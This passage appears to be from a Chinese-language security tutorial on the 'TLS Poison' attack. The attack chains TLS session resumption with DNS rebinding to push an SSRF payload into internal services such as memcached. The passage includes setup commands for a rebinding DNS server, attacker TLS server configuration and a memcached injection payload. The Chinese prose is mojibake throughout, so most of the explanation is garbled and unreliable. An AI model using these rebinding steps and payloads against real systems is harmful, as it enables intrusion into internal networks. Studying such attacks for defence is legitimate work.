ï¼Œä½†æ˜¯æˆ‘ä»¬è¿™é‡Œä¸åšè¯¦ç»†çš„åˆ†æï¼Œå› ä¸ºæˆ‘ä»¬å¯ä»¥ä»ä¸‹é¢çš„ RFC 8446 æä¾›çš„æµç¨‹å›¾çœ‹å‡ºæ¥ï¼Œè™½ç„¶å¢åŠ äº†ä¸€ä¸ª early_data ï¼Œä½†æ˜¯å¯¹äºæœ¬ç¯‡æ–‡ç« æ¥è¯´å¹¶ä¸æ˜¯é‡ç‚¹ï¼Œä»–ä¾ç„¶ä½¿ç”¨äº† pre_shared_key ï¼Œæ‰€ä»¥å¯¹äºä¸Šæ–‡åŸºäº PSK çš„ä¼šè¯æ¢å¤æ¨¡å¼æ¥è¯´åŸºæœ¬ä¸€è‡´ï¼Œè¿™é‡Œå°±ä¸åšè¿‡å¤šåˆ†æï¼Œæ„Ÿå…´è¶£çš„åŒå­¦å¯ä»¥è‡ªè¡Œæœç´¢äº†è§£ã€‚\n Client Server ClientHello + early_data + key_share* + psk_key_exchange_modes + pre_shared_key (Application Data*) --------\u0026gt; ServerHello + pre_shared_key + key_share* {EncryptedExtensions} + early_data* {Finished} \u0026lt;-------- [Application Data*] (EndOfEarlyData) {Finished} --------\u0026gt; [Application Data] \u0026lt;-------\u0026gt; [Application Data] + Indicates noteworthy extensions sent in the previously noted message. * Indicates optional or situation-dependent messages/extensions that are not always sent. () Indicates messages protected using keys derived from a client_early_traffic_secret. {} Indicates messages protected using keys derived from a [sender]_handshake_traffic_secret. [] Indicates messages protected using keys derived from [sender]_application_traffic_secret_N. Figure 4: Message Flow for a 0-RTT Handshake SSRF æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€  (Server-Side Request Forgery, SSRF) æ˜¯ä¸€ç§ç”±æ”»å‡»è€…æ„é€ å½¢æˆç”±æœåŠ¡ç«¯å‘èµ·è¯·æ±‚çš„ä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRFæ”»å‡»çš„ç›®æ ‡æ˜¯ä»å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿã€‚ï¼ˆæ­£æ˜¯å› ä¸ºå®ƒæ˜¯ç”±æœåŠ¡ç«¯å‘èµ·çš„ï¼Œæ‰€ä»¥å®ƒèƒ½å¤Ÿè¯·æ±‚åˆ°ä¸å®ƒç›¸è¿è€Œä¸å¤–ç½‘éš”ç¦»çš„å†…éƒ¨ç³»ç»Ÿï¼‰\nSSRF å½¢æˆçš„åŸå› å¤§éƒ½æ˜¯ç”±äºæœåŠ¡ç«¯æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½ä¸”æ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšè¿‡æ»¤ä¸é™åˆ¶ã€‚æ¯”å¦‚ä»æŒ‡å®šURLåœ°å€è·å–ç½‘é¡µæ–‡æœ¬å†…å®¹ï¼ŒåŠ è½½æŒ‡å®šåœ°å€çš„å›¾ç‰‡ï¼Œä¸‹è½½ç­‰ç­‰ã€‚\n \nDNS Rebinding DNSé‡æ–°ç»‘å®šæ˜¯è®¡ç®—æœºæ”»å‡»çš„ä¸€ç§å½¢å¼ã€‚ åœ¨è¿™ç§æ”»å‡»ä¸­ï¼Œæ¶æ„ç½‘é¡µä¼šå¯¼è‡´è®¿é—®è€…è¿è¡Œå®¢æˆ·ç«¯è„šæœ¬ï¼Œæ”»å‡»ç½‘ç»œä¸Šå…¶ä»–åœ°æ–¹çš„è®¡ç®—æœºã€‚æ”»å‡»è€…æ³¨å†Œä¸€ä¸ªåŸŸåï¼ˆå¦‚attacker.comï¼‰ï¼Œå¹¶åœ¨æ”»å‡»è€…æ§åˆ¶ä¸‹å°†å…¶ä»£ç†ç»™DNSæœåŠ¡å™¨ã€‚ æœåŠ¡å™¨é…ç½®ä¸ºå¾ˆçŸ­å“åº”æ—¶é—´çš„TTLè®°å½•ï¼Œé˜²æ­¢å“åº”è¢«ç¼“å­˜ã€‚ å½“å—å®³è€…æµè§ˆåˆ°æ¶æ„åŸŸæ—¶ï¼Œæ”»å‡»è€…çš„DNS æœåŠ¡å™¨é¦–å…ˆç”¨æ‰˜ç®¡æ¶æ„å®¢æˆ·ç«¯ä»£ç çš„æœåŠ¡å™¨çš„ IP åœ°å€ä½œå‡ºå“åº”ã€‚ ä¾‹å¦‚ï¼Œä»–ä»¬å¯ä»¥å°†å—å®³è€…çš„æµè§ˆå™¨æŒ‡å‘åŒ…å«æ—¨åœ¨åœ¨å—å®³è€…è®¡ç®—æœºä¸Šæ‰§è¡Œçš„æ¶æ„ JavaScript æˆ– Flash è„šæœ¬çš„ç½‘ç«™ã€‚\næ¶æ„å®¢æˆ·ç«¯ä»£ç ä¼šå¯¹åŸå§‹åŸŸåï¼ˆä¾‹å¦‚attacker.comï¼‰è¿›è¡Œé¢å¤–è®¿é—®ï¼Œè¿™äº›éƒ½æ˜¯ç”±åŒæºæ”¿ç­–æ‰€å…è®¸çš„ã€‚ ä½†æ˜¯ï¼Œå½“å—å®³è€…çš„æµè§ˆå™¨è¿è¡Œè¯¥è„šæœ¬æ—¶ï¼Œå®ƒä¼šä¸ºè¯¥åŸŸåˆ›å»ºä¸€ä¸ªæ–°çš„ DNS è¯·æ±‚ï¼Œå¹¶ä¸”æ”»å‡»è€…ä¼šä½¿ç”¨æ–°çš„ IP åœ°å€è¿›è¡Œå›å¤ã€‚ ä¾‹å¦‚ï¼Œä»–ä»¬å¯ä»¥ä½¿ç”¨å†…éƒ¨ IP åœ°å€æˆ–äº’è”ç½‘ä¸ŠæŸä¸ªç›®æ ‡çš„IPåœ°å€è¿›è¡Œå›å¤ã€‚\n \nTLS Poison å¥½äº†ï¼Œç»ˆäºä»‹ç»å®ŒèƒŒæ™¯çŸ¥è¯†äº†ï¼Œç°åœ¨è®©æˆ‘ä»¬æ¥çœ‹çœ‹æœ¬æ¬¡è¦ä»‹ç»çš„ TLS Poison æ”»å‡»ã€‚\nè¿™é‡Œä¸€å¥è¯å¸®å¤§å®¶æ€»ç»“æ¦‚æ‹¬ä¸€ä¸‹ï¼šæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ TLS Session Resumption çš„ç‰¹æ€§ç»“åˆ DNS Rebinding æŠ€å·§æ“ä½œä¸€äº›å®¢æˆ·ç«¯å¸®åŠ©æˆ‘ä»¬è¿›è¡Œ SSRF æ”»å‡»ã€‚\nå…¶å®æ•´ä¸ªæ”»å‡»å°±åƒä¸Šè¿°è¯´çš„ä¸€æ ·ï¼Œéå¸¸é€šä¿—æ˜“æ‡‚ï¼Œæ— éå°±æ˜¯ TLS Session Resumption ã€ DNS Rebinding ã€ä¸€ä¸ªå‚»ç™½ç”œå—å®³è€…ï¼Œç»“åˆåœ¨ä¸€èµ·å°±ä¾¿æœ‰äº†æˆ‘ä»¬çš„ TLS Poison ã€‚\nPS: å¦‚æ— ç‰¹æ®Šè¯´æ˜ï¼Œæ•´ä¸ªå®éªŒèƒŒæ™¯å‡åŸºäº Ubuntu 20.04 LTS ï¼Œcurl 7.68.0 build with OpenSSL/1.1.1f ï¼Œåæ–‡æåˆ°çš„ IPv6 å‡æŒ‡çš„æ˜¯ IPv4-mapped IPv6 addresses è¿™ç±»åœ°å€\nAttack Steps è®©æˆ‘ä»¬è¿›ä¸€æ­¥æ¥çœ‹çœ‹è¿™ä¸ªæ”»å‡»æ€è·¯ï¼š\n é¦–å…ˆæˆ‘ä»¬å¯ä»¥ä»èƒŒæ™¯çŸ¥è¯†å½“ä¸­çŸ¥é“ TLS Session Resumption ç‰¹æ€§ï¼Œæ— è®ºæ˜¯ TLS 1.2 æˆ–è€… 1.3 ï¼Œå®ƒä»¬éƒ½ä¼šä½¿ç”¨äº†ä¸€ä¸ªå‡­æ®ä¸€æ ·çš„ä¸œè¥¿æ¥è¡¨æ˜å®¢æˆ·ç«¯çš„èº«ä»½ï¼Œå°±åƒåœ¨ Web æµè§ˆä¸­çš„ Cookie ä¸€æ ·ï¼Œè¿™ä¸ªå‡­æ®åˆæ˜¯ç”±æœåŠ¡ç«¯ä¸‹å‘ç»™å®¢æˆ·ç«¯çš„ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬æœ‰ä¸€ä¸ªæ¶æ„çš„ Server ï¼Œè®©ä¸€ä¸ªå®¢æˆ·ç«¯ä½¿ç”¨ HTTPS è®¿é—®æˆ‘ä»¬çš„æœåŠ¡å™¨æ—¶ï¼Œåœ¨ TLS æ¡æ‰‹æ—¶è¿™ä¸ªå‡­æ®å°±æ˜¯æˆ‘ä»¬æ¶æ„æœåŠ¡å™¨åˆ†é…ç»™å®¢æˆ·ç«¯çš„ï¼Œè€Œå®¢æˆ·ç«¯ä¼šæŠŠè¿™ä¸ªå‡­æ®æŒ‰ç…§ä¸€å®šè§„åˆ™å­˜å‚¨èµ·æ¥ï¼Œä»¥ä¾¿ä»¥åéœ€è¦è·Ÿæˆ‘ä»¬æ¶æ„æœåŠ¡å™¨æ¢å¤ä¸Šä¸€æ¬¡ä¼šè¯æ—¶ä½¿ç”¨ã€‚æ‰€ä»¥ï¼Œä»è¿™é‡Œæˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œå¦‚æœå¯ä»¥è®©å®¢æˆ·ç«¯ä»¥ HTTPS å½¢å¼è®¿é—®ä»»æ„æœåŠ¡å™¨ï¼Œåœ¨è¿›è¡Œ TLS æ¡æ‰‹æ—¶æˆ‘ä»¬å¯ä»¥è®©å®¢æˆ·ç«¯å­˜å‚¨æˆ‘ä»¬æŒ‡å®šçš„ä¼šè¯å‡­æ®ã€‚ æ¥ç€ï¼Œåœ¨è¿›è¡Œ HTTPS è¯·æ±‚å‰ï¼Œå®¢æˆ·ç«¯å¿…å®šéœ€è¦å¯¹æˆ‘ä»¬ç»™çš„åŸŸåè¿›è¡Œä¸€æ¬¡ DNS æŸ¥è¯¢ï¼Œè€Œåœ¨å®¢æˆ·ç«¯æƒ³è¦æ¢å¤ä¼šè¯çš„æ—¶å€™ï¼Œå¦‚æœå®¢æˆ·ç«¯çš„ DNS ç¼“å­˜è¿‡æœŸï¼Œåˆ™åˆä¼šè¿›è¡Œä¸€æ¬¡ DNS æŸ¥è¯¢ï¼›å¦‚æœæ²¡æœ‰è¿‡æœŸï¼Œåˆ™åˆ©ç”¨ä¹‹å‰çš„ DNS æŸ¥è¯¢ç»“æœå¾—åˆ°çš„ IP è¿›è¡Œæ¢å¤ä¼šè¯ã€‚æ‰€ä»¥å½“æ¡ä»¶æ»¡è¶³ï¼Œä¹Ÿå°±æ˜¯æ­£å¥½åœ¨å®¢æˆ·ç«¯æƒ³è¦æ¢å¤ TLS ä¼šè¯ï¼Œè€Œ DNS ç¼“å­˜åˆè¿‡æœŸäº†çš„æ—¶å€™ï¼Œå°±ä¼šå‘èµ·ä¸€æ¬¡ DNS æŸ¥è¯¢ï¼Œè¿™é‡Œæ­£å¥½å°±æ»¡è¶³äº† DNS Rebinding çš„æ¡ä»¶ã€‚ è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ä¸ºè‡ªå·±çš„åŸŸåæ­å»ºä¸€ä¸ª DNS æœåŠ¡å™¨ï¼Œåœ¨å®¢æˆ·ç«¯ç¬¬ä¸€æ¬¡å‘èµ· DNS è¯·æ±‚æ—¶ï¼Œæˆ‘ä»¬è®© DNS æœåŠ¡å™¨è¿”å›æ­£ç¡®çš„ã€æŒ‡å‘æˆ‘ä»¬æ¶æ„æœåŠ¡å™¨çš„ IP ï¼Œè®©ç¬¬ä¸€æ¬¡ TLS æ¡æ‰‹æˆåŠŸï¼Œä¹Ÿè®©å®¢æˆ·ç«¯ç¼“å­˜æˆ‘ä»¬åˆ¶å®šçš„ä¼šè¯å‡­æ®ï¼›åœ¨å®¢æˆ·ç«¯æ¢å¤ä¼šè¯æ—¶ï¼Œä¹Ÿå°±æ˜¯å®¢æˆ·ç«¯å‘èµ·ç¬¬äºŒæ¬¡ DNS è¯·æ±‚æ—¶ï¼Œæˆ‘ä»¬è®© DNS æœåŠ¡å™¨è¿”å›æˆ‘ä»¬æƒ³è¦æ”»å‡»çš„å†…ç½‘åœ°å€ï¼Œä¾‹å¦‚ 127.0.0.1 ï¼Œè¿™æ ·åœ¨å®¢æˆ·ç«¯å°è¯•æ¢å¤ä¼šè¯çš„æ—¶å€™ï¼Œå®¢æˆ·ç«¯ä¼šæ‹¿ç€æˆ‘ä»¬ç»™å®ƒçš„ç‰¹åˆ¶ç¥¨æ®å»ä¸è¿™ä¸ªåœ°å€å°è¯•è¿›è¡Œ TLS æ¡æ‰‹ã€‚ è¿™æ„å‘³ç€ä»€ä¹ˆå‘¢ï¼Ÿç‰¹åˆ¶çš„ç¥¨æ®ã€æŒ‡å®šçš„å†…ç½‘åœ°å€ï¼Œå°±æ„æˆäº†ä¸€æ¬¡å¯¹å†…ç½‘æœåŠ¡çš„è¯·æ±‚ï¼  ä½†æ˜¯ä¼¼ä¹æˆ‘ä»¬åˆå¿½ç•¥äº†ä»€ä¹ˆï¼Ÿå¦‚æœæˆ‘æƒ³æ”»å‡»å†…ç½‘çš„ Memcached ï¼Œç«¯å£åœ¨ 11211 ä¸åœ¨ 443 æ€ä¹ˆåŠï¼Ÿæ­£å¦‚æˆ‘ä»¬ä¸Šé¢æ‰€å¼ºè°ƒçš„â€œå®¢æˆ·ç«¯ä¼šæŠŠè¿™ä¸ªå‡­æ®æŒ‰ç…§ä¸€å®šè§„åˆ™å­˜å‚¨èµ·æ¥â€ï¼Œé‚£ä¹ˆè¿™ä¸ªä¸€å®šè§„åˆ™åˆæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ\næˆ‘ä»¬å¯ä»¥éšä¾¿æ‰¾ä¸ªä¾‹å­æ¥çœ‹ï¼Œæ¯”å¦‚ curl 7.75.0 ï¼Œåœ¨ curl æºç çš„ lib/vtls/vtls.c#408 æ–‡ä»¶å½“ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°è¿™æ ·çš„ä»£ç ï¼š\nfor(i = 0; i \u0026lt; data-\u0026gt;set.general_ssl.max_ssl_sessions; i++) { check = \u0026amp;data-\u0026gt;state.session[i]; if(!check-\u0026gt;sessionid) /* not session ID means blank entry */ continue; if(strcasecompare(name, check-\u0026gt;name) \u0026amp;\u0026amp; ((!conn-\u0026gt;bits.conn_to_host \u0026amp;\u0026amp; !check-\u0026gt;conn_to_host) || (conn-\u0026gt;bits.conn_to_host \u0026amp;\u0026amp; check-\u0026gt;conn_to_host \u0026amp;\u0026amp; strcasecompare(conn-\u0026gt;conn_to_host.name, check-\u0026gt;conn_to_host))) \u0026amp;\u0026amp; ((!conn-\u0026gt;bits.conn_to_port \u0026amp;\u0026amp; check-\u0026gt;conn_to_port == -1) || (conn-\u0026gt;bits.conn_to_port \u0026amp;\u0026amp; check-\u0026gt;conn_to_port != -1 \u0026amp;\u0026amp; conn-\u0026gt;conn_to_port == check-\u0026gt;conn_to_port)) \u0026amp;\u0026amp; (port == check-\u0026gt;remote_port) \u0026amp;\u0026amp; strcasecompare(conn-\u0026gt;handler-\u0026gt;scheme, check-\u0026gt;scheme) \u0026amp;\u0026amp; Curl_ssl_config_matches(ssl_config, \u0026amp;check-\u0026gt;ssl_config)) { /* yes, we have a session ID! */ (*general_age)++; /* increase general age */ check-\u0026gt;age = *general_age; /* set this as used in this age */ *ssl_sessionid = check-\u0026gt;sessionid; if(idsize) *idsize = check-\u0026gt;idsize; no_match = FALSE; break; } } ä¸Šè¿°ä»£ç å°±æ˜¯é€šè¿‡å¯¹äºç«¯å£ã€åè®®ã€åŸŸåçš„æ¯”è¾ƒæ¥å†³å®šæ˜¯å¦ä½¿ç”¨ sessionid ï¼Œè€Œcheckå˜é‡çš„ç»“æ„ä½“å°±æ˜¯Curl_ssl_sessionï¼Œåœ¨ lib/urldata.h#295 å½“ä¸­ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥çœ‹åˆ°å¯¹äºCurl_ssl_sessionç»“æ„ä½“çš„å®šä¹‰\n/* information stored about one single SSL session */ struct Curl_ssl_session { char *name; /* host name for which this ID was used */ char *conn_to_host; /* host name for the connection (may be NULL) */ const char *scheme; /* protocol scheme used */ void *sessionid; /* as returned from the SSL layer */ size_t idsize; /* if known, otherwise 0 */ long age; /* just a number, the higher the more recent */ int remote_port; /* remote port */ int conn_to_port; /* remote port for the connection (may be -1) */ struct ssl_primary_config ssl_config; /* setup for this session */ }; æ‰€ä»¥å¯¹äº curl 7.75.0 æ¥è¯´ï¼Œè¿™ä¸ªè§„åˆ™å°±æ˜¯ç«¯å£ç›¸åŒã€åŸŸåç›¸åŒã€åè®®ç›¸åŒï¼Œ curl å°±ä¼šå°è¯•å»ä½¿ç”¨ sessionid è¿›è¡Œè®¿é—®ã€‚\næ‰€ä»¥æ•´ä¸ªæ”»å‡»æ€è·¯æˆ‘ä»¬å¤§ä½“ä¸Šå°±æ˜ç™½äº†ï¼Œè®©æˆ‘ä»¬å†æ¥çœ‹çœ‹ä½œè€…å½“åˆæå‡ºçš„æ”»å‡»æµç¨‹ï¼Œç›´è§‚æ„Ÿå—ä¸€ä¸‹è¿™ä¸ªæ”»å‡»ï¼ˆè¿™é‡Œæˆ‘ä»¬ç”¨ HTTPS ä¸¾ä¾‹ï¼‰ï¼š\n é¦–å…ˆç¬¬ä¸€æ­¥æ”»å‡»è€…å‘é€ä¸€ä¸ª https://jmaddux.com:25 çš„åœ°å€ç»™ä¸€ä¸ª Client ï¼ŒClient ä¼šé¦–å…ˆè¿›è¡Œ DNS æŸ¥è¯¢è¯¢é—® jmaddux.com çš„ IP åœ°å€ï¼Œæ­¤æ—¶æ”»å‡»è€…è‡ªå·±æ§åˆ¶çš„ DNS Server å¯ä»¥è‡ªå®šä¹‰å“åº”ä¸ºä¸€ä¸ªæ­£å¸¸çš„ IP ï¼Œæ¯”å¦‚ 35.x.x.x ï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥ç»™è¿™ä¸ªå“åº”è®°å½•éå¸¸çŸ­éå¸¸çŸ­çš„ TTL ï¼Œä»¥ä¾¿è®© Client ä¸è¦ç¼“å­˜æˆ‘ä»¬çš„ DNS è®°å½•ã€‚   \nç¬¬äºŒæ­¥ï¼Œ Client ä¼šä¸æ”»å‡»è€…æŒ‡å®šçš„ 35.x.x.x è¿™ä¸ªæ”»å‡»è€…çš„æœåŠ¡å™¨è¿›è¡Œ TLS æ¡æ‰‹ï¼Œå¹¶è·å¾—æ”»å‡»è€…æœåŠ¡å™¨è¿”å›ç»™ Client çš„ç‰¹åˆ¶çš„ç¥¨æ®ï¼Œåœ¨å›¾ä¸­è¡¨ç¤ºä¸º Payload ï¼Œç„¶åå®Œæˆ TLS æ¡æ‰‹ã€‚   \nç¬¬ä¸‰éƒ¨ï¼Œå½“ Client æƒ³ä¸ Server æ¢å¤ä¼šè¯æ—¶ï¼Œéœ€è¦å†æ¬¡æŸ¥æ‰¾ jmaddux.com çš„ DNS è®°å½•ï¼Œç”±äºæ”»å‡»è€…ä¹‹å‰ç»™çš„ DNS è®°å½• TTL æ—¶é—´éå¸¸éå¸¸çŸ­ï¼Œè®©å…¶åœ¨æ­¤æ—¶åœ¨è‡ªå·±çš„ç¼“å­˜ä¸­æŸ¥ä¸åˆ°åŸæ¥çš„è®°å½•ï¼Œè¿™æ ·ä¼šä½¿å¾— Client åˆå»è¯¢é—® jmaddux.com çš„ DNS è®°å½•ï¼Œæ­¤æ—¶æ”»å‡»è€…è®©å…¶ DNS Server è¿”å› 127.0.0.1 è¿™ä¸ªåœ°å€ã€‚   \næœ€åï¼Œå¦‚æœ Client ä¸æ ¡éªŒæœ¬æ¬¡è·å¾—çš„ ip æ˜¯å¦ä¸ä¸Šæ¬¡ä¸€è‡´ï¼Œå°±ä¼šå°è¯•ä¸ 127.0.0.1:25 è¿›è¡Œ TLS Session Resumption ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œ Client ä¼šæ‹¿ç€æ”»å‡»è€…ç‰¹åˆ¶çš„ç¥¨æ®è®¿é—® 127.0.0.1:25 ï¼Œå°è¯•ä¸ä¹‹æ¢å¤ TLS ä¼šè¯ï¼Œè¿™é‡Œå°±è¡¨ç°ä¸º Client å‘é€å«æœ‰ Payload çš„ Client Hello æ¶ˆæ¯åˆ° SMTP æœåŠ¡å™¨ï¼Œè‡³æ­¤å®Œæˆä¸€æ¬¡ SSRF æ”»å‡»ã€‚   \næ•´ä½“çš„æµç¨‹å›¾å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\n \nè¿™é‡Œå†å¯¹å›¾ä¸­è¿›è¡Œä¸€äº›è§£é‡Šï¼š\n æ”»å‡»è€…é€šè¿‡ä¸€äº›æ–¹å¼è®©å—å®³è€…æ‰“å¼€ä¸€ä¸ª HTML é¡µé¢ï¼Œå…¶ä¸­å†…å®¹ä¼šå‘æ”»å‡»è€…å‡†å¤‡çš„ TLS Server https://ssltest.jmaddux.com:11211 å‘èµ·è¯·æ±‚ å½“å—å®³è€…æ‰“å¼€è¿™ä¸ªé¡µé¢åï¼Œå—å®³è€…å®¢æˆ·ç«¯ä¼šæŸ¥è¯¢ ssltest.jmaddux.com çš„ DNS è®°å½•ï¼Œæœ€ç»ˆä¼šåœ¨æ”»å‡»è€…å‡†å¤‡çš„ DNS æœåŠ¡å™¨æŸ¥è¯¢åˆ°æ”»å‡»è€…æä¾›çš„è§£æè®°å½• æ­¤æ—¶ DNS æœåŠ¡å™¨æ­£å¸¸è¿”å›ç»“æœä¸º TLS Server åœ°å€å¹¶ä¸” TTL ä¸º 0 çš„å“åº” å®¢æˆ·ç«¯å‘é€ Client Hello æ¶ˆæ¯ æœåŠ¡ç«¯è¿”å› Server Hello æ¶ˆæ¯ï¼Œå¹¶åœ¨å“åº”åŒ…ä¸­è®¾ç½® session_id ä¸º payload è¿›è¡Œåç»­çš„TLSæ¡æ‰‹ æ¡æ‰‹å®Œæˆåè¿›è¡Œ http é€šä¿¡æ—¶ï¼Œæ”»å‡»è€… TLS Server è¿”å› 301 è·³è½¬åˆ° https://ssltest.jmaddux.com:11211 å—å®³è€…å®¢æˆ·ç«¯é‡æ–°åŠ è½½ https://ssltest.jmaddux.com:11211 ç†è®ºä¸Šç”±äºä¹‹å‰ DNS å“åº”çš„æŠ¥æ–‡ç»“æœä¸­ TTL ä¸º 0 ï¼Œå—å®³è€…å®¢æˆ·ç«¯ä¼šå†æ¬¡å‘ DNS æœåŠ¡å™¨è¯¢é—® ssltest.jmaddux.com çš„è§£æç»“æœ æ­¤æ—¶æ”»å‡»è€…è®© DNS æœåŠ¡å™¨è¿”å›è§£æç»“æœä¸º 127.0.0.1 ä¸” TTL ä¸º 0 æ¥ç€ç”±äº TLS ä¼šè¯é‡ç”¨ï¼Œå—å®³è€…å®¢æˆ·ç«¯ä¼šä½¿ç”¨ä¹‹å‰çš„ session_id ä¹Ÿå°±æ˜¯ payload ï¼Œå¸¦ç€è¿™ä¸ª payload ä¸ 127.0.0.1:11211 è¿›è¡Œ TLS ä¼šè¯é‡ç”¨å°è¯• payload è¢«å‘é€è‡³ 127.0.0.1:11211 ï¼Œè¾¾åˆ°æ”»å‡»è€…ç›®çš„ï¼Œä½†æ˜¯å› ä¸ºä¼šè¯é‡ç”¨å¤±è´¥ï¼Œå—å®³è€…å®¢æˆ·ç«¯ä¼šå¾—åˆ°ä¸€ä¸ª TLS Error çš„é”™è¯¯ã€‚è‡³æ­¤å®Œæˆæ‰€æœ‰æ”»å‡»æ­¥éª¤ã€‚  Setup å¥½äº†ï¼Œæ¥ä¸‹æ¥å°±è®©æˆ‘ä»¬è‡ªå·±åŠ¨æ‰‹è¯•ä¸€è¯•å§ï¼ç”±äºæˆ‘æ˜¯ä½¿ç”¨çš„æ˜¯ä¸¤ä¸ª VPS ï¼Œæ²¡æœ‰åƒåŸä½œè€…ä¸€æ ·ä½¿ç”¨ docker ï¼Œæ‰€ä»¥ä½¿ç”¨ docker çš„åŒå­¦è¿˜è¯·è‡ªè¡Œæ‘¸ç´¢ã€‚å¹¶ä¸”ç”±äºå›½å†…å¤æ‚çš„ç½‘ç»œç¯å¢ƒï¼Œä¸ºäº†é¿å…ä¸å¿…è¦çš„éº»çƒ¦ï¼Œæˆ‘ä½¿ç”¨çš„æ˜¯ä¸¤å°å›½å¤–çš„ VPS ä½œä¸ºå­¦ä¹ ä½¿ç”¨ã€‚\næˆ‘å‡†å¤‡çš„æ˜¯ä¸€ä¸ªåŸŸåã€ä¸¤å° VPS ï¼Œå…¶ä¸­ä¸€å° VPS ä½œä¸º DNS æœåŠ¡å™¨ï¼Œå¦å¤–ä¸€å°ä½œä¸º TLS æœåŠ¡å™¨ï¼Œä¸¤å° VPS å‡æ˜¯ ubuntu 20.04 LTS ã€‚ä½œè€…ä»“åº“å¯¹äºå„è‡ª VPS çš„å‡†å¤‡å·¥ä½œå·²ç»ä»‹ç»å¾—æ¯”è¾ƒå…¨é¢äº†ï¼Œè¯¦ç»†å¯ä»¥å‚é˜…ï¼šhttps://github.com/jmdx/TLS-poison/#instructions ï¼Œè¿™é‡Œå°±ä¸å†èµ˜è¿°äº†ã€‚\nå”¯ä¸€å¯èƒ½éœ€è¦è¯´ä¸€ä¸‹çš„å°±æ˜¯è¯ä¹¦ç”³è¯·ï¼Œè¿™éƒ¨åˆ†ä½œè€…æ²¡æœ‰æåˆ°ï¼Œä¸ºäº†é¿å…ä¸€äº›åŒå­¦ä¸æ¸…æ¥šçš„ï¼Œå¯ä»¥å‚è€ƒä¸€ä¸‹ï¼ŒçŸ¥é“äº†çš„åŒå­¦å°±å¯ä»¥è·³è¿‡äº†ã€‚åœ¨ TLS æœåŠ¡å™¨ä¸Šçš„è¯ä¹¦å‡†å¤‡å·¥ä½œï¼š\n æŒ‰ç…§ https://certbot.eff.org/instructions å®‰è£…å¯¹åº”çš„ cerbot ç„¶åæ¨èä½¿ç”¨ DNS changllenges çš„æ–¹å¼å¼„è¯ä¹¦ï¼Œå½“ç„¶å…¶ä»–æ–¹å¼ä¹Ÿå¯ä»¥ã€‚certbot --manual --preferred-challenges dns certonly æŒ‰ç…§è‡ªå·±çš„ä¿¡æ¯å¡«å¥½åï¼Œä¼šæç¤ºéœ€è¦åˆ°ä½ çš„ DNS åŸŸåç®¡ç†å•†å¤„å¢åŠ ä¸€ä¸ª TXT è®°å½•ï¼Œç›´æ¥æ·»åŠ ä¸Šå»å°±å¥½äº†  ç„¶åæœ€åæˆ‘ä»¬åœ¨åŸŸåçš„ DNS ä¸Šé…ç½®ä¸€ä¸‹å¦‚ä¸‹çš„åŸºæœ¬è®¾ç½®ï¼Œè¿™é‡Œä»¥åŸŸåä¸º example.com ä¸¾ä¾‹ï¼š\n   Type Name Value     A dns (Your DNS VPS IP)   NS tls dns.example.com   TXT _acme-challenge (è¿™é‡Œæ˜¯ cerbot éªŒè¯ç”¨çš„å­—ç¬¦ä¸²)    ç„¶åå°±å…ˆåœ¨ DNS VPS ä¸Šè¿è¡Œä½œè€…çš„ alternate-dns.py\nsudo python3 alternate-dns.py tls.example.com,127.0.0.1 -b 0.0.0.0 -t Your_TLS_IP -d 8.8.8.8 ç°åœ¨å°±ä¸‡äº‹ä¿±å¤‡å•¦ï¼\nLet\u0026rsquo;s Try!\nOriginal Method æ¥ä¸‹æ¥æˆ‘ä»¬åœ¨ TLS VPS è¿›è¡Œä¸€ä¸‹æ“ä½œï¼Œé¦–å…ˆç”±äºä½œè€…åŸæ¥æ˜¯ä½¿ç”¨çš„æ˜¯ docker ï¼Œæ‰€ä»¥æœ‰äº›é…ç½®æˆ‘ä»¬éœ€è¦æ›´æ”¹ä¸€ä¸‹ï¼š\n åœ¨ client-hello-poisoning/custom-tls/src/main.rs#642 æ–‡ä»¶ä¸­ï¼Œéœ€è¦æŠŠredis://redis/æ›´æ”¹ä¸ºè‡ªå·± TLS æœåŠ¡å™¨ä¸Šçš„ redis åœ°å€ï¼Œæ¯”å¦‚é»˜è®¤çš„æ˜¯ 127.0.0.1:6379 ï¼Œè¿™é‡Œæˆ‘ä»¬å°±æ”¹æˆredis://127.0.0.1:6379/ åœ¨åŸä½œè€…çš„æ–¹æ³•ä¸­ï¼Œ payload çš„è®¾ç½®éœ€è¦åœ¨ redis å½“ä¸­è®¾ç½®ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨ redis è®¾ç½®å¥½ payload ï¼Œå¦‚ï¼šset payload \u0026quot;\\r\\nset foo 0 0 12\\r\\ntls session \\r\\n\u0026quot;  å…¶ä¸­ payload æ˜¯ redis å½“ä¸­çš„ key ï¼Œvalue æ˜¯çœŸæ­£å‘é€ç»™ memcached çš„å†…å®¹ Memcached éœ€è¦ä»¥ CRLF ä½œä¸ºæ•´ä¸ªå‘½ä»¤çš„ç»“æŸï¼Œå¹¶ä¸”å¯ä»¥å¿½ç•¥ä¹‹å‰çš„è¯­å¥é”™è¯¯ï¼Œè€ŒåŸä½œè€…çš„æ–‡æ¡£ä¸­ç»™å‡ºçš„ payload æ˜¯ä»¥ \\r ç»“æŸï¼Œä¼šå¯¼è‡´å†™ä¸è¿› memcached ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ³¨æ„ä¸€ä¸‹ï¼Œæˆ‘ä»¬è¿™é‡Œå¯ä»¥ä½¿ç”¨\u0026quot;\\r\\nset foo 0 0 13\\ni in ur cache\\r\\n\u0026quot;ä½œä¸º payload ã€‚  è¿™é‡Œå¦‚æœè¦ä¿®æ”¹çš„è¯è®°å¾—æ”¹ set 